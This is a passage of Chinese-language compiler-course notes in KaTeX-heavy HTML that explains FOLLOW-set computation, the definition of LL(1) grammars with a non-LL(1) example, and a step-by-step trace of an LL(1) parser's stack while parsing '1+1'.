src="https://upyun.wuuconix.link/image-20211108205239414.png" alt="答案" /></p><p>我们来分析一下，这些follow都运用了哪些求法。</p><ol><li><p>follow(E) 首先，这里E应该算开始符号，故$加入follow集，然后根据产生式<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mo>→</mo><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">F\rightarrow(E)|id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mclose">)</span><span class="mord">∣</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span></span></span></span>。我们可以看到右括号紧紧挨着语法变量E，直接符合定义，故follow(E) = {$, )}</p></li><li><p>然后follow(E’) 为什么直接等于follow(E)了呢？因为根据产生式<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo>→</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">E\rightarrow TE&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>。这里运用求法3，可以直接把Follow(E)放入Follow(E’)中。</p><blockquote><p>这里注意要求什么符号得follow集，就要把看成A，把其他的符号看成B来运用6个求法。</p><p>你可能会怀疑这里为什么不用产生式 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mo>+</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mi mathvariant="normal">∣</mi><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow +TE&#x27; | \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord">+</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathdefault">ϵ</span></span></span></span>。因为你会发现这个无法运用任何求法。</p></blockquote></li><li><p>然后求follow(T)。求什么，我们就需要去看哪些产生式中有T。首先第一个产生式<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo>→</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">E\rightarrow TE&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>中有T。这里其实符合两个求法，首先符合求法2，我们需要将<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIRST(E&#x27;)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>加入follow集中，然后其实还符合求法3，因为E’可以推导为空串。故还需要将<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FOLLOW(E)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault">L</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mclose">)</span></span></span></span>放入follow集中。   再看产生式<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mo>+</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mi mathvariant="normal">∣</mi><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow+TE&#x27;|\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord">+</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathdefault">ϵ</span></span></span></span>。同样符合求法3，原因同上，故需要将<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FOLLOW(E&#x27;)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault">L</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>加入follow集中。  然后因为我们之前加了三个东西，可能会产生重复，故用并集来合并。</p><blockquote><p>你可能会疑惑为什么没有使用产生式$ F \rightarrow FT’$。</p><p>我们发现这个产生式，F在左侧，所以我们也许可能应用求法5和求法6。</p><p>但是都不符合。</p><p>实际上我们再观察一下，这些解法中都由一个基本要求，你这个产生式中至少得有一个终结符号吧233，这个产生式是一个语法变量推导出了两个语法变量，就没法求follow集了。</p></blockquote></li></ol><h3 id="ll1文法"><a class="markdownIt-Anchor" href="#ll1文法"></a> LL(1)文法</h3><p>对于G中得任意变量A，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><msub><mi>α</mi><mn>1</mn></msub><mi mathvariant="normal">∣</mi><msub><mi>α</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">∣</mi><msub><mi>α</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">A\rightarrow \alpha_1|\alpha_2|...|\alpha_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是G得所有A产生式，它们满足下列条件，则称G是LL(1)文法。</p><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>I</mi><mi>T</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><msub><mi>α</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>∩</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><msub><mi>α</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>ϕ</mi><mtext>  </mtext><mi>i</mi><mi mathvariant="normal">≠</mi><mi>j</mi></mrow><annotation encoding="application/x-tex">FITST(\alpha_i)\cap FIRST(\alpha_j)=\phi\ \ i\ne j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">ϕ</span><span class="mspace"> </span><span class="mspace"> </span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span></li><li>当<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi><mo>∈</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><msub><mi>α</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\epsilon\in FIRST(\alpha_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">ϵ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>时，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo><mo>∩</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><msub><mi>α</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">FOLLOW(A)\cap FIRST(\alpha_i)=\phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault">L</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathdefault">A</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">ϕ</span></span></span></span></li></ul><p>LL(1)文法表示了自顶向下方法能够处理的一类文法。</p><ol><li>第一个L表示从左向右扫描输入符号串</li><li>第二个L表示生成最左推导</li><li>1表示读入一个符号可确定下一步推导</li></ol><p>表达式文法是LL(1)文法。</p><p><img src="https://upyun.wuuconix.link/image-20211108212057869.png" alt="表达式文法" /></p><p>不是LL(1)的文法就会不确定性。</p><p><img src="https://upyun.wuuconix.link/image-20211108212211523.png" alt="不是LL(1)文法的例子" /></p><p>我们观察第二个产生式<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>a</mi><mi>b</mi><mi mathvariant="normal">∣</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">A\rightarrow ab|a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord">∣</span><span class="mord mathdefault">a</span></span></span></span>。它有两个候选式，分别是a和ab。first(ab)和first(a)的值都是a，它们有了交集，不符合LL(1)文法的定义，所以它不是LL(1)文法。我们可以看到就因为first集有重叠，当语法分析器去分析cad这个字符的时候，就会去试探和回溯，这就是不确定性。</p><p>所以LL(1)的直观映像就是候选式那些follow集没有重叠的文法，也就是语法分析的时候不会有不确定性，非常顺畅。</p><h3 id="不确定性的解决方法"><a class="markdownIt-Anchor" href="#不确定性的解决方法"></a> 不确定性的解决方法</h3><ol><li><p>采用回溯算法</p><blockquote><p>这让编程能力羸弱的我无所应对</p></blockquote></li><li><p>改写文法</p><p>将非LL(1)文法该写为等价的LL(1)文法</p></li><li><p>无法改写时：</p><ul><li>增加其他的判别因素</li><li>文法过于复杂，无法用自顶向下方法处理。</li></ul></li></ol><h3 id="预测分析器-ll1分析器-结构"><a class="markdownIt-Anchor" href="#预测分析器-ll1分析器-结构"></a> 预测分析器 LL（1）分析器 结构</h3><p><img src="https://upyun.wuuconix.link/image-20211111195257962.png" alt="系统结构" /></p><p>LL（1）分析器主要的组成部分有输入缓冲区、栈、预测分析表M。</p><p>栈就是普通的堆栈，有栈底，有栈顶，栈底为$。</p><p>输入缓冲区里就是我们需要来分析的句子。串结束符也是$</p><p>预测分析表是我们分析的依据，实际情况下需要程序员根据文法的产生式手动写。</p><h3 id="ll1分析器-栈的变化的例子"><a class="markdownIt-Anchor" href="#ll1分析器-栈的变化的例子"></a> LL（1）分析器 栈的变化的例子</h3><p>看懂了下面的图，你对LL（1）分析法就了解的差不多了。</p><p>文法：</p><p>E-&gt;TE’</p><p>E’-&gt;+TE’|ε</p><p>T-&gt;id</p><p>要分析的句子 1+1</p><p><img src="https://upyun.wuuconix.link/image-20211111195818563.png" alt="栈的变化" /></p><p>首先分为分析的句子是1+1，我们需要把它加入输入缓冲区中，注意在结尾加上结束标识。</p><p>然后开始初始化分析栈，即图中的第一步。它有两个步骤，一是将栈底符号$和开始符号E分别入栈。二是将输入指针指向输入缓冲区的第一个字符。</p><p>接着开始开始分析栈顶符号E和当前输入符号1。我们以人的视角来看的话，这时候很显然需要把<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span></span></span></span>进行推导，因为E不等于1。所以根据产生式<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo>→</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">E\rightarrow TE&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>，把栈中的E用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">TE&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>代替。注意在栈中的排列顺序，产生式最左边的符号需要放到栈顶。</p><blockquote><p>因为这时LL分析法，它需要找到一个最左推导。故它需要对最左侧的语法变量先进行推导。故把它们放到栈上方的话才能够优先和输入字符进行反应。</p></blockquote><p>图中省略的第二部应该就是E弹栈的过程，因为肯定需要先把E弹掉，E’ 和T才能进来嘛233。之后省略的步骤也是省略的弹栈的过程。</p><p>现在我们考虑图中的第三步。再分析栈顶符号T和当前输入符号1。因为T能够推导出id，所以这时候我们需要将T推导为id，即到了第五步。</p><p>在第五步中，栈顶符号为id，当前输入符号为1，1就是id，匹配了，这时候我们需要把id弹栈。然后把输入指针往后移1位。相当于1已经被识别了。</p><p>第七步。栈顶符号E’，输入符号位+。这时候很显然我们需要利用产生式<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mo>+</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mi mathvariant="normal">∣</mi><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow +TE&#x27; | \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord">+</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathdefault">ϵ</span></span></span></span> 。将E’ 推导为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>+</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">+TE&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.835222em;vertical-align:-0.08333em;"></span><span class="mord">+</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing 